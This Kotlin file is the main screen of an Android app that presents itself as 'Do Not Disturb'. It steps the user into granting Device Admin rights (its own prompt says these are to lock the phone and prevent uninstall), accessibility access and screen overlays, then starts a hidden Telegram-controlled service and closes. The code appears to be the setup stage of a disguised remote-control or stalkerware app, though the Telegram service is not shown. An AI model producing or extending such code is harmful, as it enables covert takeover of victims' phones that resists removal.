package com.donotdisturb.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var btnStep1: Button
    private lateinit var btnStep2: Button
    private lateinit var btnStep3: Button
    private lateinit var btnStep4: Button
    private lateinit var tvStatus: TextView

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponentName: ComponentName

    companion object {
        const val REQUEST_CODE_DEVICE_ADMIN = 1
        const val REQUEST_CODE_ACCESSIBILITY = 3
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponentName = ComponentName(this, AdminReceiver::class.java)

        initViews()
        updateButtonStates()
    }

    private fun initViews() {
        btnStep1 = findViewById(R.id.btnStep1)
        btnStep2 = findViewById(R.id.btnStep2)
        btnStep3 = findViewById(R.id.btnStep3)
        btnStep4 = findViewById(R.id.btnStep4)
        tvStatus = findViewById(R.id.tvStatus)

        btnStep1.setOnClickListener {
            if (!isDeviceAdminActive()) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponentName)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Device Admin required to lock phone and prevent uninstall")
                }
                startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN)
            }
        }

        btnStep2.setOnClickListener {
            if (!isAccessibilityServiceEnabled()) {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                Toast.makeText(this, "Find 'Do Not Disturb' and enable it", Toast.LENGTH_LONG).show()
                startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY)
            }
        }

        btnStep3.setOnClickListener {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName"))
                startActivity(intent)
            }
        }

        btnStep4.setOnClickListener {
            if (allPermissionsGranted()) {
                startTelegramService()
                Toast.makeText(this, "Setup Complete! Use Telegram to control.", Toast.LENGTH_LONG).show()
                finishAffinity()
            } else {
                Toast.makeText(this, "Complete all steps first", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun updateButtonStates() {
        val adminActive = isDeviceAdminActive()
        val accessibilityEnabled = isAccessibilityServiceEnabled()
        val overlayAllowed = Settings.canDrawOverlays(this)

        btnStep1.isEnabled = !adminActive
        btnStep1.text = if (adminActive) "Step 1: Device Admin ✓" else "Step 1: Enable Device Admin"
        
        btnStep2.isEnabled = adminActive && !accessibilityEnabled
        btnStep2.text = if (accessibilityEnabled) "Step 2: Accessibility ✓" else "Step 2: Enable Accessibility"
        
        btnStep3.isEnabled = accessibilityEnabled && !overlayAllowed
        btnStep3.text = if (overlayAllowed) "Step 3: Overlay ✓" else "Step 3: Enable Overlay"
        
        btnStep4.isEnabled = adminActive && accessibilityEnabled && overlayAllowed
        btnStep4.text = if (btnStep4.isEnabled) "Step 4: Complete Setup" else "Step 4: Complete Above Steps"

        tvStatus.text = when {
            adminActive && accessibilityEnabled && overlayAllowed -> "All permissions granted!"
            adminActive && accessibilityEnabled -> "Step 3 remaining"
            adminActive -> "Step 2 & 3 remaining"
            else -> "Complete Step 1 first"
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        return devicePolicyManager.isAdminActive(adminComponentName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityEnabled = Settings.Secure.getInt(contentResolver,
            Settings.Secure.ACCESSIBILITY_ENABLED, 0)
        if (accessibilityEnabled == 1) {
            val services = Settings.Secure.getString(contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            return services?.contains(packageName) == true
        }
        return false
    }

    private fun allPermissionsGranted(): Boolean {
        return isDeviceAdminActive() && isAccessibilityServiceEnabled() && Settings.canDrawOverlays(this)
    }

    private fun startTelegramService() {
        val serviceIntent = Intent(this, TelegramService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    override fun onResume() {
        super.onResume()
        updateButtonStates()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        updateButtonStates()
    }
}
